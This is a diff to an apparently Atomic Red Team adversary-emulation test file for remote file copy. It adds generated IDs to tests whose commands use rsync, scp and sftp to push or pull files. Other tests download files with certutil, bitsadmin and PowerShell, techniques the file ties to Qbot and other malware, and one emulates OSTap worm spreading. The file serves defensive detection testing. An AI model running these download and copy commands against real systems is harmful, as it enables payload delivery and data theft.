@@ -4,6 +4,7 @@ display_name: Remote File Copy
 
 atomic_tests:
 - name: rsync remote file copy (push)
+  auto_generated_guid: 5f354c24-41dd-4bb0-81dd-50b2063f600f
   description: |
     Utilize rsync to perform a remote file copy (push)
   supported_platforms:
@@ -32,6 +33,7 @@ atomic_tests:
       rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 
 - name: rsync remote file copy (pull)
+  auto_generated_guid: 98a00afe-cbf1-4f1b-94d5-c278365fa5eb
   description: |
     Utilize rsync to perform a remote file copy (pull)
   supported_platforms:
@@ -60,6 +62,7 @@ atomic_tests:
       rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 
 - name: scp remote file copy (push)
+  auto_generated_guid: b482f00e-8fec-4c63-a966-f3ccbbd4484a
   description: |
     Utilize scp to perform a remote file copy (push)
   supported_platforms:
@@ -88,6 +91,7 @@ atomic_tests:
       scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 
 - name: scp remote file copy (pull)
+  auto_generated_guid: 236e8b07-ba27-4ce2-bccb-61a8f03de0da
   description: |
     Utilize scp to perform a remote file copy (pull)
   supported_platforms:
@@ -116,6 +120,7 @@ atomic_tests:
       scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
 - name: sftp remote file copy (push)
+  auto_generated_guid: 46d0bb1b-8962-490e-b1c9-93de0161a643
   description: |
     Utilize sftp to perform a remote file copy (push)
   supported_platforms:
@@ -144,6 +149,7 @@ atomic_tests:
       sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
 
 - name: sftp remote file copy (pull)
+  auto_generated_guid: 3ff16771-cdd1-4c3d-962f-2727d99c7746
   description: |
     Utilize sftp to perform a remote file copy (pull)
   supported_platforms:
@@ -171,6 +177,7 @@ atomic_tests:
     command: |
       sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 - name: certutil download (urlcache)
+  auto_generated_guid: b4ec5bcc-b3cc-44cc-8ab5-a38a27153c51
   description: |
     Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!
   supported_platforms:
@@ -190,6 +197,7 @@ atomic_tests:
     command: |
       cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
 - name: certutil download (verifyctl)
+  auto_generated_guid: 6e3ff814-56a0-482e-8342-7b1b89427628
   description: |
     Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!
   supported_platforms:
@@ -214,6 +222,7 @@ atomic_tests:
       Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
 
 - name: Windows - BITSAdmin BITS Download
+  auto_generated_guid: 7d7629ba-3591-4a02-b1fd-6a78f636884a
   description: |
     This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
     This technique is used by Qbot malware to download payloads.
@@ -238,6 +247,7 @@ atomic_tests:
       C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
 
 - name: Windows - PowerShell Download
+  auto_generated_guid: 8c31b39a-ed28-4b05-8417-a67314edf46c
   description: |
     This test uses PowerShell to download a payload.
     This technique is used by multiple adversaries and malware families.
@@ -260,6 +270,7 @@ atomic_tests:
       Remove-Item #{destination_path} -Force -ErrorAction Ignore
 
 - name: OSTAP Worming Activity
+  auto_generated_guid: 2a267648-2b89-4344-9365-94342dbfe1fe
   description: |
     OSTap copies itself in a specfic way to shares and secondary drives. This emulates the activity.
   supported_platforms:
